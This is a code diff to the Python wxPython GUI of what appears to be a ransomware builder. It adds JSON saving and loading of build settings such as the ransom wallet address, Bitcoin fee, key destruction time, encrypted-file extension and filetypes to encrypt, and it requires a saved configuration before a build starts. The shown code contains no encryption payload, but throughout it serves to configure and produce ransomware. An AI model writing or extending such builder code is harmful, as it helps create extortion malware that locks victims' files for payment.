@@ -6,10 +6,11 @@
 
 # Import libs
 import wx
-from wx.lib.pubsub import setuparg1
-from wx.lib.pubsub import pub as Publisher
 import datetime
 import time
+import json
+from wx.lib.pubsub import setuparg1
+from wx.lib.pubsub import pub as Publisher
 
 # Import package modules
 from .BuilderGuiAbsBase import MainFrame
@@ -24,87 +25,176 @@ class Gui(MainFrame):
     @summary: Provides a GUI object
     '''
     
-    def __init__(self, config_dict):
+    def __init__(self):
         '''
         @summary: Constructor
         @param config_dict: The build configuration, if present
+        @param load_config: Handle to a config loader method/object
         @todo: Catch Frame close event and ensure thread stop is run too
         '''
         self.language = DEFAULT_LANGUAGE
         self.__builder = None
+        self.config_file_path = None
         
         # Init super - MainFrame
         MainFrame.__init__( self, parent=None )
         self.console = Console(self.ConsoleTextCtrl)
-        self.StatusBar.SetStatusText("READY...")
+        self.StatusBar.SetStatusText("Ready...")
         
         # Set initial event handlers
         self.set_events()
         
-        # Update configuration
-        self.update_config_values(config_dict)
-        
     
     def update_config_values(self, config_dict):
         '''
-        @summary: Updates the GUI field values with those in the config_dict
+        @summary: Updates the GUI field values with those in the config_dict. Sets to
+        empty string if the item is not in the config dict
         @param config_dict: The config dict loaded from the build config file, if any
         '''
         
         # Parse values
-        if config_dict:
-            # Builder Language
-            if "builder_language" in config_dict:
-                if unicode(config_dict["builder_language"]) not in SUPPORTED_LANGUAGES:
-                    self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
-                else:
-                    self.BuilderLanguageChoice.SetString(0, config_dict["builder_language"])
-                    if config_dict["builder_language"] != self.language:
-                        self.update_language(None, language=config_dict["builder_language"])
-            # Debug Level
-            if "debug_level" in config_dict:
-                self.DebugLevelChoice.SetSelection(
-                    self.DebugLevelChoice.FindString(config_dict["debug_level"])
-                    )
-            # Major Version
-            if "maj_version" in config_dict:
-                self.MajorVersionTextCtrl.SetValue(config_dict["maj_version"])
-            # Minor Version
-            if "min_version" in config_dict:
-                self.MinorVersionTextCtrl.SetValue(config_dict["min_version"])
-            # Filename
-            if "filename" in config_dict:
-                self.FilenameTextCtrl.SetValue(config_dict["filename"])
-            # Extension
-            if "extension" in config_dict:
-                self.ExtensionTextCtrl.SetValue(config_dict["extension"])
-            # PyInstaller AES Key
-            if "pyinstaller_aes_key" in config_dict:
-                self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
-            # Icon File
-            if "icon_file" in config_dict:
-                self.IconFilePicker.SetPath(config_dict["icon_file"])
-            # Encrypted File Extension
-            if "encrypted_file_extension" in config_dict:
-                self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
-            # Wallet Address
-            if "wallet_address" in config_dict:
-                self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
-            # Bitcoin Fee
-            if "bitcoin_fee" in config_dict:
-                self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
-            # Key Destruction time
-            if "key_destruction_time" in config_dict:
-                self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
-            # Max file size to encrypt
-            if "max_file_size_to_encrypt" in config_dict:
-                self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
-            # Filetypes to encrypt
-            if "filetypes_to_encrypt" in config_dict:
-                filetypes = ",".join(config_dict["filetypes_to_encrypt"])
-                self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
+        # Builder Language
+        if "builder_language" in config_dict:
+            if unicode(config_dict["builder_language"]) not in SUPPORTED_LANGUAGES:
+                self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
+            else:
+                self.BuilderLanguageChoice.SetString(0, config_dict["builder_language"])
+                if config_dict["builder_language"] != self.language:
+                    self.update_language(None, language=config_dict["builder_language"])
+        else:
+            self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
+        # Debug Level
+        if "debug_level" in config_dict:
+            self.DebugLevelChoice.SetSelection(
+                self.DebugLevelChoice.FindString(config_dict["debug_level"])
+                )
+        else:
+            self.DebugLevelChoice.SetSelection(0)
+        # Major Version
+        if "maj_version" in config_dict:
+            self.MajorVersionTextCtrl.SetValue(config_dict["maj_version"])
+        else:
+            self.MajorVersionTextCtrl.SetValue("")
+        # Minor Version
+        if "min_version" in config_dict:
+            self.MinorVersionTextCtrl.SetValue(config_dict["min_version"])
+        else:
+            self.MinorVersionTextCtrl.SetValue("")
+        # Filename
+        if "filename" in config_dict:
+            self.FilenameTextCtrl.SetValue(config_dict["filename"])
+        else:
+            self.FilenameTextCtrl.SetValue("")
+        # Extension
+        if "extension" in config_dict:
+            self.ExtensionTextCtrl.SetValue(config_dict["extension"])
+        else:
+            self.ExtensionTextCtrl.SetValue("")
+        # PyInstaller AES Key
+        if "pyinstaller_aes_key" in config_dict:
+            self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
+        else:
+            self.PyInstallerAesKeyTextCtrl.SetValue("")
+        # Icon File
+        if "icon_file" in config_dict:
+            self.IconFilePicker.SetPath(config_dict["icon_file"])
+        else:
+            self.IconFilePicker.SetPath("")
+        # Encrypted File Extension
+        if "encrypted_file_extension" in config_dict:
+            self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
+        else:
+            self.EncryptedFileExtensionTextCtrl.SetValue("")
+        # Wallet Address
+        if "wallet_address" in config_dict:
+            self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
+        else:
+            self.WalletAddressTextCtrl.SetValue("")
+        # Bitcoin Fee
+        if "bitcoin_fee" in config_dict:
+            self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
+        else:
+            self.BitcoinFeeTextCtrl.SetValue("")
+        # Key Destruction time
+        if "key_destruction_time" in config_dict:
+            self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
+        else:
+            self.KeyDestructionTimeTextCtrl.SetValue("")
+        # Max file size to encrypt
+        if "max_file_size_to_encrypt" in config_dict:
+            self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
+        else:
+            self.MaxFileSizeTextCtrl.SetValue("")
+        # Filetypes to encrypt
+        if "filetypes_to_encrypt" in config_dict:
+            filetypes = ",".join(config_dict["filetypes_to_encrypt"])
+            self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
+        else:
+            self.FiletypesToEncryptTextCtrl.SetValue("")
             
-    
+            
+    def __save_config(self, event):
+        '''
+        @summary: Saves the configuration/user input data to the configuration file
+        @todo: Test
+        '''
+        # If not saved, used currently loaded config file path
+        if self.SaveFilePicker.GetPath():
+            self.config_file_path = self.SaveFilePicker.GetPath()
+
+        # Get data from form
+        user_input_dict = self.__get_input_data()
+        # Format filetypes to encrypt
+        user_input_dict["filetypes_to_encrypt"] = user_input_dict["filetypes_to_encrypt"].split(",")
+        
+        # Try to write the config to file
+        try:
+            with open(self.config_file_path, "w") as config_file_handle:
+                json.dump(user_input_dict, config_file_handle, indent=4)
+                self.console.log(msg="Build configuration successfully saved to file %s"
+                                 % self.config_file_path)
+                self.StatusBar.SetStatusText("Config Saved To %s" % self.config_file_path)
+                self.__build_config_file = self.config_file_path
+        except Exception as ex:
+            self.console.log(msg="The configuration could not be saved to %s: %s"
+                             % (self.config_file_path, ex),
+                             ccode=ERROR_CANNOT_WRITE
+                             )
+            self.StatusBar.SetStatusText("Error saving configuration file %s" % self.config_file_path)
+            self.config_file_path = None
+
+                
+
+    def __load_config(self, event):
+        '''
+        @summary: Loads builder config from file and updates the form values
+        @param self.config_file_path: The path of the config file to load
+        '''
+        config_dict = {}
+        self.config_file_path = self.LoadFilePicker.GetPath()
+
+        # Try to load config file and update the GUI
+        try:
+            with open(self.config_file_path, "r") as config_file_handle:
+                config_dict = json.load(config_file_handle)
+                self.console.log(msg="Build configuration successfully loaded from %s"
+                                 % self.config_file_path)
+                self.StatusBar.SetStatusText("Config Loaded From %s" % self.config_file_path)
+                self.__build_config_file = self.config_file_path
+        except Exception as ex:
+            self.console.log(msg="The specified configuration file at %s could not be loaded: %s" 
+                             % (self.config_file_path, ex),
+                             ccode=ERROR_INVALID_CONFIG_FILE
+                             )
+            self.StatusBar.SetStatusText("Error loading configuration file %s" % self.config_file_path)
+            self.config_file_path = None
+
+        # Update the GUI
+        self.update_config_values(config_dict)
+        
+        return config_dict
+
+        
     def set_events(self):
         '''
         @summary: Set GUI events for the various controls
@@ -112,6 +202,10 @@ class Gui(MainFrame):
         
         # Catch Language choice changes
         self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)
+        
+        # Catch config file load and save
+        self.Bind(wx.EVT_FILEPICKER_CHANGED, self.__load_config, self.LoadFilePicker)
+        self.Bind(wx.EVT_FILEPICKER_CHANGED, self.__save_config, self.SaveFilePicker)
 
         # BUILD button
         self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
@@ -157,13 +251,13 @@ class Gui(MainFrame):
                 # Set final output message and destroy the thread
                 if self.__builder.finished_with_error():
                     self.console.log(msg="Build finished with error")
-                    self.StatusBar.SetStatusText("BUILD FAILED...")
+                    self.StatusBar.SetStatusText("Build Failed...")
                 elif self.__builder.finished_with_success():
                     self.console.log(msg="Build successful")
-                    self.StatusBar.SetStatusText("BUILD SUCCESSFUL...")
+                    self.StatusBar.SetStatusText("Build Successful...")
                 elif self.__builder.finished_with_stop():
                     self.console.log(msg="Build terminated by user")
-                    self.StatusBar.SetStatusText("BUILD TERMINATED...")
+                    self.StatusBar.SetStatusText("Build Terminated...")
                 self.BuildButton.SetLabel("BUILD")
                 self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
 
@@ -199,18 +293,14 @@ class Gui(MainFrame):
         
         if self.__builder and self.__builder.is_in_progress():
             self.__builder.stop()
+            
+            
+    def __get_input_data(self):
+        '''
+        @summary: Retrieves and returns the user's input data from the GUI form
+        @return: input data as a dictionary
+        '''
 
-        
-    def __start_build(self, event):
-        '''
-        @summary: Launches the validate and build processes
-        '''
-        # Set progress gauge to zero and start progress pulse
-        self.BuildProgressGauge.SetValue(0)
-        self.BuildProgressGauge.Pulse()
-        self.StatusBar.SetStatusText("RUNNING BUILD...")
-        
-        # Read the form contents and pass to Builder validate.
         user_input_dict = OrderedDict()
         # Builder Language
         user_input_dict["builder_language"] = self.BuilderLanguageChoice.GetString(
@@ -245,11 +335,24 @@ class Gui(MainFrame):
             self.DebugLevelChoice.GetSelection()
             )
         
+        return user_input_dict
+
+        
+    def __start_build(self, event):
+        '''
+        @summary: Launches the validate and build processes
+        '''
+        # Set progress gauge to zero and start progress pulse
+        self.BuildProgressGauge.SetValue(0)
+        self.BuildProgressGauge.Pulse()
+        self.StatusBar.SetStatusText("Running Build...")
+        
+        user_input_dict = self.__get_input_data()
+        
         # Reset all labels to standard foreground colour
         for input_field in CONFIG_ITEMS:
             label_object_name = CONFIG_ITEMS[input_field]["label_object_name"]
             self.set_label_colour(label_object_name, colour="default")
-            
             
         # Clear the Console and setup debug
         self.console.clear()
@@ -258,9 +361,24 @@ class Gui(MainFrame):
         self.console.log(msg="Build Launched")
         self.console.log(msg="DEBUG Level: %s" % user_input_dict["debug_level"])
         self.console.set_debug_level(user_input_dict["debug_level"])
-
         
-        # Create listener and Launch the Build thread
+        # ERROR if the config has not yet been saved
+        if not self.config_file_path:
+            self.console.log(msg="The configuration must be manually saved, or an existing configuration"
+                             " loaded, before the build can proceed",
+                             ccode=ERROR_FILE_NOT_FOUND
+                             )
+            self.console.log(msg="Build finished with error")
+            self.StatusBar.SetStatusText("Build Failed...")
+            self.BuildButton.SetLabel("BUILD")
+            self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
+            for percentage in range(100):
+                self.BuildProgressGauge.SetValue(percentage)
+            return
+        else:
+           self.__save_config(None) 
+        
+        # Create listeners and Launch the Build thread
         Publisher.subscribe(self.__update_progress, "update")
         self.__builder = BuilderThread(user_input_dict)
         
